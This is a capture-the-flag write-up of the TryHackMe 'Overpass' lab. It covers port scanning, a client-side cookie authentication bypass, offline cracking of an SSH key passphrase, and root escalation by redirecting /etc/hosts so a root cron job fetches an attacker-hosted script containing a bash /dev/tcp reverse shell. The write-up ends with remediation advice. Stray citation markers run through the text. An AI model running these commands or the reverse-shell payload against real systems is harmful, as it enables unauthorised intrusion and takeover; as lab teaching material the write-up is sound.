# TryHackMe Write-Up: Overpass[cite: 8]

**Scope:** Controlled TryHackMe lab environment[cite: 8]  
**Assessment outcome:** Full compromise to root[cite: 8]

## 1. Executive Summary
During the assessment of the Overpass machine, multiple critical security misconfigurations were identified, resulting in a full system compromise.[cite: 8] The initial breach was achieved by exploiting a broken client-side authentication mechanism on the administrative web portal, which allowed unauthenticated access to sensitive data.[cite: 8] An encrypted SSH private key was discovered, and its weak passphrase was successfully cracked offline.[cite: 8] Privilege escalation to root was accomplished by hijacking local DNS routing via a misconfigured `/etc/hosts` file, allowing interception of a high-privileged automated cron job.[cite: 8]

## 2. Reconnaissance
The assessment began with a standard port scan to identify active services, revealing a web server and SSH.[cite: 8]

~~~bash
nmap -sC -sV <TARGET_IP>
~~~

Directory enumeration against the web server uncovered a hidden administrative login panel (`/admin`) and a public downloads directory containing source code.[cite: 8]

~~~bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
~~~

## 3. Foothold
Inspection of the `/admin` login page revealed that authentication logic was insecurely handled via client-side JavaScript.[cite: 8] The code checked for the presence of a Session Token cookie rather than verifying cryptographic session data on the backend server.[cite: 8]

This logic flaw was bypassed by manually injecting the expected cookie directly into the browser console:[cite: 8]

~~~javascript
document.cookie="SessionToken=admin; path=/";
~~~

Refreshing the page granted unauthorized access to the admin dashboard, revealing an encrypted RSA private key for the user `james`.[cite: 8] The key was saved locally and secured with proper permissions:[cite: 8]

~~~bash
nano id_rsa
chmod 600 id_rsa
~~~

Because the key was encrypted with AES-128, it required a passphrase.[cite: 8] The key was formatted for offline cracking using `ssh2john`, and the passphrase (`james13`) was successfully recovered using John the Ripper and the rockyou.txt wordlist:[cite: 8]

~~~bash
ssh2john id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
~~~

Using the recovered passphrase, secure shell access was achieved:[cite: 8]

~~~bash
ssh -i id_rsa james@<TARGET_IP>
~~~

## 4. Privilege Escalation
System enumeration revealed an insecure automated task (cron job) running as root every minute.[cite: 8] The task utilized `curl` to download and execute a bash script from a hardcoded domain (`overpass.thm`):[cite: 8]

~~~bash
cat /etc/crontab
# * * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
~~~

Further auditing revealed that the system's local DNS configuration file (`/etc/hosts`) had insecure permissions, allowing the `james` user to modify it.[cite: 8] The `/etc/hosts` file was edited to redirect requests for `overpass.thm` to the attacker's IP address:[cite: 8]

~~~text
<KALI_IP> overpass.thm
~~~

The directory structure expected by the cron job was replicated on the attacker machine, and a malicious script containing a reverse shell payload was created:[cite: 8]

~~~bash
mkdir -p downloads/src
echo 'bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1' > downloads/src/buildscript.sh
~~~

A local web server was hosted on port 80 to serve the payload, alongside a Netcat listener to catch the reverse shell:[cite: 8]

~~~bash
sudo python3 -m http.server 80
nc -lvnp 4444
~~~

Within 60 seconds, the root cron job executed the malicious payload, granting a `#` root shell.[cite: 8]

## 5. Remediation
To secure the server against these attack vectors, the following actions are recommended:[cite: 8]
* **Implement Server-Side Authentication:** Move all session validation logic to the backend.[cite: 8] The server must verify cryptographic tokens against an active session database before serving restricted content.[cite: 8]
* **Enforce Strong Passphrase Policies:** The compromised SSH key used a highly dictionary-susceptible passphrase (`james13`).[cite: 8] Enforce strict complexity requirements for all encrypted credentials.[cite: 8]
* **Restrict System File Permissions:** Remove world-writable and group-writable permissions from `/etc/hosts` to prevent local DNS hijacking.[cite: 8] It should only be editable by root (`chmod 644 /etc/hosts`).[cite: 8]
* **Secure Automated Tasks:** Avoid piping `curl` directly into `bash` in cron jobs.[cite: 8] Scripts should be stored locally, heavily restricted, and executed using absolute file paths rather than fetching code from web domains.[cite: 8]
